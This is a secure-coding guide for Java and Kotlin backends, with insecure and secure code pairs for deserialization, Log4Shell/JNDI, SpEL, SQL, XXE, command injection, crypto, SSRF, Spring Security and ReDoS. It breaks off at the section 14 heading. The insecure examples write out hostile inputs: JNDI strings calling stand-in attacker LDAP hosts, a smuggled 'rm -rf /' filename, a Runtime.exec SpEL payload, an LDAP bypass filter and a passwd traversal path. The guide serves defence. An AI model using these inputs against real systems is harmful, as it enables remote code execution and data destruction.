# ☕ Java & Kotlin (JVM) Security Rules

> **Standard:** Java & Kotlin JVM Backend Security
> **Sources:** Oracle Java Security Advisories, Kotlin Security Docs, NIST NVD, OWASP Java Security Cheat Sheet, CVE Details, Snyk Advisories, Spring Security Reference
> **Version:** 1.0.0
> **Last updated:** March 2026
> **Scope:** Java 11+ and Kotlin 1.9+ on the JVM, Spring Boot, Log4j, Jackson, JDBC, JPA/Hibernate, kotlinx.serialization. Kotlin/JS and Kotlin/Native are out of scope. Android Kotlin is covered in `security-mobile`.

---

## General Instructions

Apply these rules to all Java and Kotlin code running on the JVM. Sections 1–16 cover Java/JVM vulnerabilities that apply equally to both languages. Section 17 covers Kotlin-specific risks arising from language features not present in Java. Follow the mandatory rules and use the ✅/❌ examples as references.

---

## 1. Java Deserialization — ObjectInputStream

**Vulnerability:** Java's native serialization protocol executes arbitrary code during deserialization via `readObject()`, `readResolve()`, `readExternal()`, and `validateObject()` callbacks. An attacker supplies a gadget chain — a sequence of existing classes in the classpath — to trigger Remote Code Execution. Libraries like Apache Commons Collections, Spring, Groovy, and many JEE application server runtimes contain exploitable gadget chains catalogued by ysoserial.

**References:** CWE-502, CVE-2015-4852 (Apache Commons Collections — WebLogic RCE), CVE-2020-9484 (Tomcat session deserialization), Oracle Critical Patch Updates

### Mandatory Rules

- **Never deserialize untrusted bytes with `ObjectInputStream`** — there is no safe way to deserialize attacker-controlled Java serialized data without a strict filter.
- **Apply `ObjectInputFilter` (JEP 290, Java 9+)** on every `ObjectInputStream` to allowlist only the specific classes expected: `ObjectInputFilter.Config.createFilter("classname=com.example.SafeDto;maxdepth=5;maxbytes=10000;reject=*")`.
- Configure a **process-wide JVM serial filter** via the system property `jdk.serialFilter` to serve as a last-resort backstop.
- Prefer **JSON (`Jackson`, `Gson`, `System.Text.Json` for interop), Protocol Buffers, or Avro** for data interchange.
- Audit the classpath for gadget-chain libraries — remove unnecessary `commons-collections`, `commons-beanutils`, `spring-core` transitive dependencies where not needed.

```java
// ❌ INSECURE — unrestricted deserialization → RCE via gadget chain
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject(); // Attacker sends ysoserial payload

// ✅ SECURE — allowlist filter before deserializing
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter(
    "com.example.dto.OrderDto;maxdepth=3;maxrefs=50;maxbytes=65536;reject=*"
));
OrderDto order = (OrderDto) ois.readObject(); // Only OrderDto or rejects

// ✅ SECURE — JSON instead of native serialization
ObjectMapper mapper = new ObjectMapper();
mapper.disable(MapperFeature.DEFAULT_VIEW_INCLUSION);
OrderDto order = mapper.readValue(inputStream, OrderDto.class);
```

### 1.2 XMLDecoder

**Vulnerability:** `XMLDecoder` is a Java-to-XML serialization format that, like `ObjectInputStream`, executes arbitrary code embedded in the XML. It can instantiate any class, call any method, and spawn processes via `<object class="java.lang.Runtime" method="exec">`. It has no safe mode.

**References:** CWE-502, CVE-2017-10271 (Oracle WebLogic XMLDecoder RCE, CVSS 9.8), multiple WebLogic deserialization CVEs

#### Mandatory Rules

- **Never use `XMLDecoder` on untrusted input** — treat it identically to `ObjectInputStream`.
- Replace `XMLDecoder`/`XMLEncoder` with `Jackson`, `JAXB`, or `XStream` with a security framework applied.

```java
// ❌ INSECURE — XMLDecoder executes arbitrary code from XML
XMLDecoder decoder = new XMLDecoder(inputStream);
Object obj = decoder.readObject(); // Executes <java><object class="Runtime".../>

// ✅ SECURE — use JAXB for XML data binding
JAXBContext ctx = JAXBContext.newInstance(OrderDto.class);
Unmarshaller u = ctx.createUnmarshaller();
OrderDto order = (OrderDto) u.unmarshal(secureXmlReader); // Use secure XmlReader
```

### 1.3 XStream Deserialization

**Vulnerability:** XStream deserializes arbitrary Java objects from XML or JSON by default. Without a security framework applied, it executes constructors and arbitrary methods of any class, enabling RCE. It has published 20+ CVEs since 2021.

**References:** CWE-502, CVE-2021-29505 (XStream 1.4.16 RCE, CVSS 8.8), CVE-2021-39139 through CVE-2021-39154 (multiple XStream RCE, CVSS 8.5–9.8)

#### Mandatory Rules

- **Always apply XStream's security framework** and add only the specific types your application deserializes to the allowlist.
- **Call `xstream.addPermission(NoTypePermission.NONE)` first** to deny all, then allowlist specific classes.
- Pin XStream to the latest patched version — the `1.4.x` series has a long history of deserialization CVEs.

```java
// ❌ INSECURE — default XStream deserializes any class
XStream xstream = new XStream();
Object obj = xstream.fromXML(userXml); // RCE via <sorted-set> gadget

// ✅ SECURE — deny-all, then allowlist
XStream xstream = new XStream();
xstream.addPermission(NoTypePermission.NONE);   // Deny everything
xstream.addPermission(NullPermission.NULL);      // Allow null
xstream.addPermission(PrimitiveTypePermission.PRIMITIVES); // Allow primitives
xstream.allowTypeHierarchy(OrderDto.class);      // Allow only your DTOs
Object obj = xstream.fromXML(userXml);
```

### 1.4 Jackson Polymorphic Deserialization

**Vulnerability:** Jackson's `@JsonTypeInfo(use = Id.CLASS)` or `@JsonTypeInfo(use = Id.MINIMAL_CLASS)` reads arbitrary class names from the JSON `@class` / `@c` field and instantiates them. This enables gadget-chain attacks similar to native Java deserialization.

**References:** CWE-502, CVE-2019-14540 (Jackson `commons-dbcp` gadget), CVE-2019-16335 (Jackson gadget chain), series of CVE-2017-7525 follow-ups

#### Mandatory Rules

- **Disable default typing globally**: `mapper.deactivateDefaultTyping()` (Jackson 2.10+) or `mapper.enableDefaultTyping()` must never be called.
- **Never use `@JsonTypeInfo(use = Id.CLASS)` or `Id.MINIMAL_CLASS`** on types deserialized from untrusted sources.
- Prefer **`@JsonTypeInfo(use = Id.NAME)` with an explicit `@JsonSubTypes` allowlist** for polymorphism.
- Use **`ObjectMapper` with `FAIL_ON_UNKNOWN_PROPERTIES = true`** to reject unexpected fields.

```java
// ❌ INSECURE — enables arbitrary class instantiation from JSON @class field
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);

// ❌ INSECURE — @class field in JSON → RCE via gadget chain
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
public interface Animal { }

// ✅ SECURE — name-based type info with explicit allowlist
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = Cat.class, name = "cat"),
    @JsonSubTypes.Type(value = Dog.class, name = "dog")
})
public interface Animal { }

// ✅ SECURE — strict ObjectMapper, no default typing
ObjectMapper mapper = new ObjectMapper()
    .deactivateDefaultTyping()
    .configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true)
    .configure(MapperFeature.ALLOW_COERCION_OF_SCALARS, false);
```

---

## 2. JNDI Injection and Log4Shell

**Vulnerability:** JNDI lookup with attacker-controlled strings — `InitialContext.lookup(userInput)` — allows loading remote code via LDAP, RMI, CORBA, or DNS. The most catastrophic example is Log4Shell (CVE-2021-44228): Log4j 2.x evaluated `${jndi:ldap://evil.com/exploit}` embedded in logged strings, achieving RCE in millions of applications.

**References:** CWE-74, CVE-2021-44228 (Log4Shell, CVSS 10.0), CVE-2021-45046 (Log4j bypass, CVSS 9.0), CVE-2021-44832, CVE-2022-23302 (Log4j 1.x JMSSink deserialization)

### Mandatory Rules

- **Upgrade Log4j to 2.17.1+ (Java 8) or 2.12.4+ (Java 7)** — versions that disable JNDI lookups by default.
- **Never use Log4j 1.x** — it is end-of-life since 2015 and contains multiple unpatched RCE vulnerabilities.
- **Set `log4j2.formatMsgNoLookups=true`** (environment/system property) as a mitigation layer even on patched versions.
- **Never call `InitialContext.lookup(userInput)` or `NamingManager.getObjectInstance(userInput, ...)`** with any string derived from external input.
- Set the JVM flag `-Dcom.sun.jndi.ldap.object.trustURLCodebase=false` and `-Dcom.sun.jndi.rmi.object.trustURLCodebase=false` on all Java 8 < 8u191 deployments.
- **Sanitize values before logging** — strip or encode `${`, `%{`, `#{` sequences from external strings before passing to any logger.

```java
// ❌ INSECURE — Log4j 2 before 2.15.0: evaluates JNDI lookups in messages
log.info("User login: {}", username);
// If username = "${jndi:ldap://attacker.com/x}" → RCE

// ❌ INSECURE — direct JNDI lookup with user input
String datasource = request.getParameter("ds");
Context ctx = new InitialContext();
DataSource ds = (DataSource) ctx.lookup(datasource); // JNDI injection

// ✅ SECURE — sanitize before logging
String safeUsername = username.replace("${", "").replace("#{", "").replace("%{", "");
log.info("User login: {}", safeUsername);

// ✅ SECURE — never look up user-supplied names; use a hardcoded allowlist
static final Map<String, String> ALLOWED_DATASOURCES = Map.of(
    "primary", "java:comp/env/jdbc/primary",
    "readonly", "java:comp/env/jdbc/readonly"
);
String jndiName = ALLOWED_DATASOURCES.get(request.getParameter("ds"));
if (jndiName == null) throw new IllegalArgumentException("Unknown datasource");
DataSource ds = (DataSource) new InitialContext().lookup(jndiName);
```

---

## 3. Expression Language (SpEL) Injection

**Vulnerability:** Spring Expression Language (`SpEL`) evaluated with user-supplied strings — via `SpelExpressionParser`, `@Value`, Spring Security SpEL expressions, or Spring Cloud Function routing — executes arbitrary Java code. Attackers use `T(java.lang.Runtime).getRuntime().exec(...)` to achieve RCE.

**References:** CWE-94, CVE-2022-22963 (Spring Cloud Function SpEL RCE, CVSS 9.8), CVE-2022-22947 (Spring Cloud Gateway SpEL RCE, CVSS 10.0), CVE-2022-22965 (Spring4Shell data binding)

### Mandatory Rules

- **Never evaluate user input as a SpEL expression** — pass user data as variables to the evaluation context, not as the expression itself.
- Use `SimpleEvaluationContext` (which restricts access to types, constructors, and static members) instead of `StandardEvaluationContext` for any expression evaluated with user-influenced values.
- **Disable Spring Cloud Function routing expressions** if not needed: `spring.cloud.function.definition` must not be derived from HTTP headers.
- For Spring4Shell (CVE-2022-22965): **do not bind `class.*`, `module.*`, or `classLoader.*` properties** in data binding — use `@InitBinder` with an allowlist.
- Keep Spring Framework patched to 5.3.18+, 6.0.x+.

```java
// ❌ INSECURE — user controls the expression string → RCE
String userExpr = request.getParameter("expr");
ExpressionParser parser = new SpelExpressionParser();
Expression expr = parser.parseExpression(userExpr); // "T(Runtime).exec('id')"
Object result = expr.getValue(); // Command execution

// ✅ SECURE — user data as variable, not as expression
ExpressionParser parser = new SpelExpressionParser();
EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding()
    .withInstanceMethods()
    .build();
context.setVariable("userInput", sanitizedUserInput); // Data, not code
Expression expr = parser.parseExpression("#userInput.toUpperCase()");
Object result = expr.getValue(context); // Safe

// ✅ SECURE — Spring4Shell: InitBinder blocks dangerous field binding
@InitBinder
void initBinder(WebDataBinder binder) {
    binder.setDisallowedFields("class.*", "module.*", "classLoader.*");
}
```

---

## 4. SQL Injection — JDBC and JPA/Hibernate

**Vulnerability:** Concatenating user input into SQL strings — in raw JDBC `Statement`, JPA `createNativeQuery`, Hibernate `createSQLQuery`, or JPQL with string interpolation — allows SQL injection. Even ORM-generated HQL can be vulnerable if user input is concatenated into query strings rather than bound as parameters.

**References:** CWE-89, OWASP SQL Injection, OWASP Java Security Cheat Sheet

### Mandatory Rules

- **Always use `PreparedStatement`** with `?` placeholders for all JDBC queries involving user data.
- **Use named or positional parameters** in JPA/Hibernate: `:param` / `?1` with `setParameter()` — never concatenate.
- **Prefer JPA Criteria API or Spring Data JPA** for dynamic queries — they generate parameterized SQL automatically.
- For dynamic column/table names (which cannot be parameterized), **validate against an explicit allowlist** of known safe identifiers.
- Set **`hibernate.use_sql_comments = false`** in production — disabling SQL comments reduces information disclosure in error logs.

```java
// ❌ INSECURE — JDBC string concatenation
String query = "SELECT * FROM users WHERE email = '" + email + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// ❌ INSECURE — JPA native query string interpolation
String hql = "FROM User WHERE email = '" + email + "'";
List<User> users = session.createQuery(hql).list();

// ❌ INSECURE — Spring Data JPA with JPQL concatenation
@Query("SELECT u FROM User u WHERE u.email = '" + "#{#email}'") // Anti-pattern

// ✅ SECURE — JDBC PreparedStatement
String sql = "SELECT * FROM users WHERE email = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, email);
ResultSet rs = ps.executeQuery();

// ✅ SECURE — JPA named parameter
TypedQuery<User> q = em.createQuery(
    "SELECT u FROM User u WHERE u.email = :email", User.class);
q.setParameter("email", email);
List<User> users = q.getResultList();

// ✅ SECURE — Spring Data JPA with named param
@Query("SELECT u FROM User u WHERE u.email = :email")
List<User> findByEmail(@Param("email") String email);

// ✅ SECURE — dynamic ORDER BY with allowlist
Set<String> ALLOWED_SORT_FIELDS = Set.of("name", "createdAt", "email");
if (!ALLOWED_SORT_FIELDS.contains(sortField))
    throw new IllegalArgumentException("Invalid sort field");
TypedQuery<User> q = em.createQuery(
    "SELECT u FROM User u ORDER BY u." + sortField, User.class);
```

---

## 5. XML External Entity (XXE) Injection

**Vulnerability:** Java's XML parsers — `DocumentBuilder`, `SAXParser`, `XMLInputFactory` (StAX), `Transformer`, `SchemaFactory`, `SAXReader` (dom4j) — resolve external entity references and DTD definitions by default (in older JDKs). An attacker injects a payload that reads local files, performs SSRF, or causes denial-of-service (Billion Laughs).

**References:** CWE-611, CVE-2022-40149 (Woodstox 6.4.0 DoS via malformed XML), CVE-2021-39149 (XStream XXE chain), OWASP XXE Prevention Cheat Sheet

### Mandatory Rules

- **Explicitly disable DTD and external entity features** on every XML parser instance — do not rely on JDK version defaults.
- Apply these features to `DocumentBuilderFactory`: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`.
- Apply these features to `SAXParserFactory`: same disallow-doctype-decl feature.
- Apply these properties to `XMLInputFactory`: `IS_SUPPORTING_EXTERNAL_ENTITIES = false`, `SUPPORT_DTD = false`.
- For `TransformerFactory` / `SchemaFactory`: call `setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "")` and `setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "")`.

```java
// ❌ INSECURE — default DocumentBuilder resolves external entities
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(userXmlStream); // XXE: reads /etc/passwd

// ❌ INSECURE — default SAXParserFactory
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser saxParser = spf.newSAXParser(); // External entity resolution

// ❌ INSECURE — default XMLInputFactory (StAX)
XMLInputFactory xif = XMLInputFactory.newInstance();
XMLStreamReader xsr = xif.createXMLStreamReader(stream);

// ✅ SECURE — DocumentBuilderFactory with all XXE protections
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(userXmlStream);

// ✅ SECURE — XMLInputFactory (StAX)
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
XMLStreamReader xsr = xif.createXMLStreamReader(stream);

// ✅ SECURE — TransformerFactory
TransformerFactory tf = TransformerFactory.newInstance();
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
```

---

## 6. Command Injection — Runtime.exec() and ProcessBuilder

**Vulnerability:** Passing user input to `Runtime.exec(String)` (which invokes `sh -c`) or constructing `ProcessBuilder` arguments by string concatenation enables command injection. Shell metacharacters (`&`, `|`, `;`, `` ` ``, `$()`) allow execution of arbitrary commands.

**References:** CWE-78, CWE-88, OWASP OS Command Injection

### Mandatory Rules

- **Never use `Runtime.exec(String)` with user input** — the single-string form passes input to the OS shell (`/bin/sh -c`).
- **Use the array form `Runtime.exec(String[])` or `ProcessBuilder(List<String>)`** to pass arguments without shell interpretation.
- **Validate the executable name against an allowlist** — never derive the command path from user input.
- Prefer **Java library alternatives** — `java.nio.file` instead of `rm`/`cp`, `java.util.zip` instead of `unzip`, etc.
- Run child processes under a **restricted OS user** with minimum required permissions.

```java
// ❌ INSECURE — single string → shell interprets metacharacters
String cmd = "convert " + userFile + " output.pdf";
Runtime.getRuntime().exec(cmd); // userFile = "x; rm -rf /"

// ❌ INSECURE — shell=true equivalent
ProcessBuilder pb = new ProcessBuilder("sh", "-c", "ls " + userDir);

// ✅ SECURE — array form, no shell interpretation
String[] cmd = {"convert", validatedInputPath, "output.pdf"};
Runtime.getRuntime().exec(cmd);

// ✅ SECURE — ProcessBuilder with structured argument list
List<String> args = new ArrayList<>();
args.add("ffmpeg");
args.add("-i");
args.add(validatedInputPath); // Pre-validated, from allowlist or UUID
args.add(outputPath);

ProcessBuilder pb = new ProcessBuilder(args);
pb.redirectErrorStream(true);
Process proc = pb.start();
proc.waitFor(30, TimeUnit.SECONDS);
```

---

## 7. Cryptography Misuse

**Vulnerability:** Using deprecated algorithms (DES, 3DES, RC4, MD5, SHA-1), insecure modes (ECB, CBC without MAC), static IVs, short keys, or `java.util.Random` for security-sensitive values weakens or completely breaks cryptographic guarantees.

**References:** CWE-327, CWE-328, CWE-330, NIST SP 800-57, OWASP Cryptographic Failures

### Mandatory Rules

- **Use AES with GCM mode** (`AES/GCM/NoPadding`) for symmetric encryption — provides authenticated encryption.
- **Never use ECB mode** (`AES/ECB/PKCS5Padding`) — it is deterministic and reveals plaintext patterns.
- **Generate a unique random IV** (12 bytes for GCM) with `SecureRandom` for every encryption operation.
- **Use `SecureRandom`** for all security-sensitive random values — never `java.util.Random` or `Math.random()`.
- **Hash passwords** with BCrypt (`spring-security-crypto`), Argon2, or PBKDF2 with HMAC-SHA256 and ≥ 310,000 iterations — never plain SHA-256.
- Use **`MessageDigest.isEqual()` or constant-time comparison** for HMAC / token comparisons to prevent timing attacks.
- Minimum key sizes: AES 256-bit, RSA 2048-bit (prefer 3072+), ECDSA P-256+.

```java
// ❌ INSECURE — DES, short key, ECB mode
Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
SecretKey key = new SecretKeySpec(eightByteKey, "DES");

// ❌ INSECURE — predictable random for session tokens
String token = Long.toString(new Random().nextLong());

// ❌ INSECURE — MD5 for password storage
MessageDigest md = MessageDigest.getInstance("MD5");
byte[] hash = md.digest(password.getBytes());

// ✅ SECURE — AES-256-GCM (authenticated encryption)
KeyGenerator keyGen = KeyGenerator.getInstance("AES");
keyGen.init(256, new SecureRandom());
SecretKey key = keyGen.generateKey();

byte[] iv = new byte[12];
new SecureRandom().nextBytes(iv);
GCMParameterSpec paramSpec = new GCMParameterSpec(128, iv);

Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
cipher.init(Cipher.ENCRYPT_MODE, key, paramSpec);
byte[] ciphertext = cipher.doFinal(plaintext);
// Store: iv + ciphertext (GCM tag is appended automatically)

// ✅ SECURE — cryptographically secure token
byte[] tokenBytes = new byte[32];
new SecureRandom().nextBytes(tokenBytes);
String token = Base64.getUrlEncoder().withoutPadding().encodeToString(tokenBytes);

// ✅ SECURE — BCrypt password hashing (Spring Security)
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
String hashed = encoder.encode(rawPassword);
boolean matches = encoder.matches(rawPassword, hashed);

// ✅ SECURE — timing-safe comparison
boolean valid = MessageDigest.isEqual(computedHmac, expectedHmac);
```

---

## 8. Path Traversal

**Vulnerability:** Constructing file paths from user input with `new File(baseDir, userInput)` or `Paths.get(baseDir, userInput)` does not prevent traversal. `../` sequences and absolute paths can escape the intended directory.

**References:** CWE-22, CVE-2023-46749 (Apache Shiro path traversal bypass), CVE-2021-41773 (path traversal class), OWASP Path Traversal

### Mandatory Rules

- **Canonicalize paths with `toRealPath()` or `toAbsolutePath().normalize()`** and verify the result starts with the expected base directory.
- **Reject file names containing `..`, `/`, `\`, or null bytes** before path construction.
- **Never use `getServletContext().getRealPath(userInput)`** for file serving — use a dedicated resource endpoint.
- Store uploads outside the web root and serve via a streaming controller.
- **Rename uploaded files** to server-generated UUIDs with a validated extension allowlist.

```java
// ❌ INSECURE — Path traversal with new File
File file = new File(uploadDir, userFilename);
// userFilename = "../../etc/passwd" → escapes uploadDir

// ❌ INSECURE — Paths.get does not prevent traversal
Path filePath = Paths.get(uploadDir, userFilename);

// ✅ SECURE — canonicalize and enforce base directory
Path safeFilePath(String baseDirectory, String userFilename) throws IOException {
    if (userFilename.contains("..") || userFilename.contains("/")
            || userFilename.contains("\\") || userFilename.contains("\0")) {
        throw new SecurityException("Invalid filename");
    }
    Path base = Paths.get(baseDirectory).toRealPath();
    Path resolved = base.resolve(userFilename).normalize();

    if (!resolved.startsWith(base)) {
        throw new SecurityException("Path traversal detected");
    }
    return resolved;
}

// ✅ SECURE — rename uploaded file to UUID
String safeFilename = UUID.randomUUID().toString() + ".pdf";
Path dest = safeFilePath(uploadDir, safeFilename);
Files.copy(uploadedInputStream, dest, StandardCopyOption.REPLACE_EXISTING);
```

---

## 9. LDAP Injection

**Vulnerability:** Concatenating user input into LDAP search filters (`(uid=<input>)`) or distinguished names allows an attacker to modify the query structure, bypass authentication, or enumerate the directory. LDAP metacharacters include `*`, `(`, `)`, `\`, and NUL.

**References:** CWE-90, OWASP LDAP Injection Prevention Cheat Sheet

### Mandatory Rules

- **Escape all user-controlled values** placed in LDAP filter strings — encode the 6 special LDAP characters: `\`, `*`, `(`, `)`, NUL, `/`.
- **Use an allowlist for acceptable input characters** (e.g., `[a-zA-Z0-9@.\-]+` for usernames) before LDAP query construction.
- Use **read-only LDAP bind accounts** with minimum required permissions for search operations.

```java
// ❌ INSECURE — LDAP filter injection
String filter = "(&(objectClass=user)(uid=" + username + "))";
// username = "*)(uid=*))(|(uid=*" → authentication bypass
NamingEnumeration<?> answer = ctx.search("ou=users,dc=example,dc=com", filter, controls);

// ✅ SECURE — encode LDAP special characters
static String encodeLdapFilter(String input) {
    StringBuilder sb = new StringBuilder();
    for (char c : input.toCharArray()) {
        switch (c) {
            case '\\' -> sb.append("\\5c");
            case '*'  -> sb.append("\\2a");
            case '('  -> sb.append("\\28");
            case ')'  -> sb.append("\\29");
            case '\0' -> sb.append("\\00");
            default   -> sb.append(c);
        }
    }
    return sb.toString();
}

String safeUsername = encodeLdapFilter(username);
String filter = "(&(objectClass=user)(uid=" + safeUsername + "))";
```

---

## 10. Server-Side Request Forgery (SSRF)

**Vulnerability:** Making HTTP requests to URLs derived from user input — via `java.net.URL`, `HttpURLConnection`, Apache `HttpClient`, or Spring `WebClient` — allows attackers to reach internal services, cloud metadata endpoints (`169.254.169.254`), and private network resources.

**References:** CWE-918, OWASP SSRF Prevention Cheat Sheet

### Mandatory Rules

- **Validate user-supplied URLs** before making requests: enforce an allowlist of permitted schemes (`https` only) and hostnames.
- **Reject private/internal IP ranges**: loopback (`127.x.x.x`), link-local (`169.254.x.x`), and RFC 1918 ranges (`10.x`, `172.16–31.x`, `192.168.x`).
- **Resolve the hostname to an IP** and validate the IP after resolution to prevent DNS rebinding attacks.
- **Set connection and read timeouts** on all external HTTP calls.
- Disable `HttpURLConnection` redirects or validate the redirect destination.

```java
// ❌ INSECURE — user controls the URL → SSRF
String targetUrl = request.getParameter("url");
URL url = new URL(targetUrl);
InputStream data = url.openStream(); // Reaches 169.254.169.254 metadata

// ✅ SECURE — allowlist-based URL validation
private static final Set<String> ALLOWED_HOSTS = Set.of("api.example.com", "cdn.example.com");

URI safeUri(String userInput) throws Exception {
    URI uri = new URI(userInput);
    if (!"https".equals(uri.getScheme()))
        throw new SecurityException("Only HTTPS is allowed");
    String host = uri.getHost();
    if (!ALLOWED_HOSTS.contains(host))
        throw new SecurityException("Host not in allowlist: " + host);
    return uri;
}

HttpClient client = HttpClient.newBuilder()
    .connectTimeout(Duration.ofSeconds(5))
    .build();
HttpRequest req = HttpRequest.newBuilder(safeUri(userInput)).GET().build();
HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
```

---

## 11. Spring Security Misconfiguration

**Vulnerability:** Overly permissive `HttpSecurity` configurations — `permitAll()` on sensitive paths, disabled CSRF, wildcard matchers, exposed actuator endpoints, missing session fixation protection — leave Spring Boot applications vulnerable to unauthenticated access, CSRF attacks, and session hijacking.

**References:** CWE-285, CWE-352, Spring Security Reference Documentation

### Mandatory Rules

- **Deny all by default** — use `.anyRequest().authenticated()` as the last rule; never use `.anyRequest().permitAll()`.
- **Never disable CSRF** (`csrf().disable()`) for stateful browser-based applications — it is required for all state-changing form or cookie-authenticated endpoints.
- **Use antMatchers/requestMatchers carefully** — avoid `/**` patterns that may match more paths than intended; prefer exact paths.
- **Enable session fixation protection** (default in Spring Security, do not disable): `sessionManagement().sessionFixation().newSession()`.
- **Restrict Spring Boot Actuator endpoints** — expose only `health` and `info` without authentication; require admin authentication for `env`, `heapdump`, `threaddump`.
- **Configure Content Security Policy and other security headers** via `HttpSecurity.headers()`.

```java
// ❌ INSECURE — disables CSRF and allows all requests
@Bean
SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http.csrf().disable()               // Disables CSRF protection
        .authorizeHttpRequests(auth ->
            auth.anyRequest().permitAll()); // No authentication required
    return http.build();
}

// ❌ INSECURE — actuator fully exposed
# application.properties
management.endpoints.web.exposure.include=*
management.endpoint.health.show-details=always

// ✅ SECURE — deny-by-default, CSRF enabled, security headers
@Bean
SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(auth -> auth
            .requestMatchers("/api/public/**").permitAll()
            .requestMatchers("/actuator/health", "/actuator/info").permitAll()
            .anyRequest().authenticated()
        )
        .csrf(csrf -> csrf
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
        )
        .sessionManagement(session -> session
            .sessionFixation().newSession()
            .maximumSessions(1)
        )
        .headers(headers -> headers
            .contentSecurityPolicy(csp ->
                csp.policyDirectives("default-src 'self'; script-src 'self'"))
            .frameOptions().deny()
            .xssProtection().headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK)
        );
    return http.build();
}

// ✅ SECURE — actuator secured
management.endpoints.web.exposure.include=health,info
management.endpoint.health.show-details=never
```

---

## 12. Mass Assignment / Data Binding

**Vulnerability:** Spring MVC and JPA/Hibernate's automatic property binding maps all HTTP request parameters to model fields, including sensitive fields (`isAdmin`, `role`, `accountBalance`). CVE-2022-22965 (Spring4Shell) exploited this to overwrite the Tomcat log configuration and write a JSP webshell.

**References:** CWE-915, CVE-2022-22965 (Spring4Shell CVSS 9.8), OWASP Mass Assignment

### Mandatory Rules

- **Use DTOs (Data Transfer Objects)** that expose only the fields the client should be able to set — never bind HTTP parameters directly to JPA entities.
- **Annotate `@InitBinder` with `setAllowedFields()`** to allowlist permitted fields, or `setDisallowedFields()` to block sensitive ones.
- For Spring4Shell mitigation: always block `class.*`, `module.*`, and `classLoader.*` in binder configuration.

```java
// ❌ INSECURE — binds all request params to entity including role, isAdmin
@PostMapping("/users/{id}")
public User updateUser(@PathVariable Long id, @ModelAttribute User user) {
    return userRepository.save(user); // Attacker sets user.role = "ADMIN"
}

// ✅ SECURE — DTO maps only allowed fields
@PostMapping("/users/{id}")
public UserResponse updateUser(@PathVariable Long id,
                               @Valid @RequestBody UpdateUserRequest req) {
    User user = userRepository.findById(id).orElseThrow();
    user.setName(req.getName());       // Only allowed fields
    user.setEmail(req.getEmail());
    return mapper.toResponse(userRepository.save(user));
}

// ✅ SECURE — @InitBinder allowlist
@InitBinder
void initBinder(WebDataBinder binder) {
    binder.setAllowedFields("name", "email", "phone");
    // Blocks class.*, classLoader.*, module.*
}
```

---

## 13. Regex — ReDoS (Regular Expression Denial of Service)

**Vulnerability:** Java's `java.util.regex.Pattern` uses a backtracking NFA engine. Patterns with ambiguous nested quantifiers (`(a+)+`, `(.+)*`, `(\w|\d)+`) applied to attacker-controlled strings cause catastrophic backtracking (exponential time), hanging the processing thread indefinitely.

**References:** CWE-1333, OWASP Denial of Service

### Mandatory Rules

- **Validate input length** before applying regex — reject excessively long strings before the regex engine sees them.
- **Avoid nested quantifiers on overlapping character classes** — rewrite patterns to non-ambiguous alternatives or use atomic groups.
- **Use `Pattern.compile` at class initialization** (static final) rather than re-compiling on every request.
- Apply regex in a **separate thread with a timeout** for patterns applied to user-supplied input.
- Use **RE2/J** (Google's linear-time regex library) as a drop-in alternative for user-facing patterns.

```java
// ❌ INSECURE — nested quantifier, no length check → ReDoS
Pattern p = Pattern.compile("^(a+)+$");
boolean match = p.matcher(userInput).matches(); // "aaaaaaaaaaaaaaaaaaa!" → hangs

// ❌ INSECURE — compiled per-request (also a performance issue)
boolean valid = Pattern.compile(userRegex).matcher(input).matches(); // User-controlled regex

// ✅ SECURE — static compile, length guard, thread-timeout
private static final Pattern EMAIL_PATTERN =
    Pattern.compile("^[^@\\s]+@[^@\\s]+\\.[^@\\s]{2,}$");

boolean validateEmail(String email) {
    if (email == null || email.length() > 254) return false; // RFC 5321 limit
    return EMAIL_PATTERN.matcher(email).matches();
}

// ✅ SECURE — thread with timeout for complex user-facing patterns
ExecutorService exec = Executors.newSingleThreadExecutor();
Future<Boolean> future = exec.submit(() -> pattern.matcher(userInput).matches());
try {
    return future.get(100, TimeUnit.MILLISECONDS);
} catch (TimeoutException e) {
    future.cancel(true);
    return false; // Treat timeout as invalid input
}
```

---

## 14. Logging — Sensitive Data and Log Injection

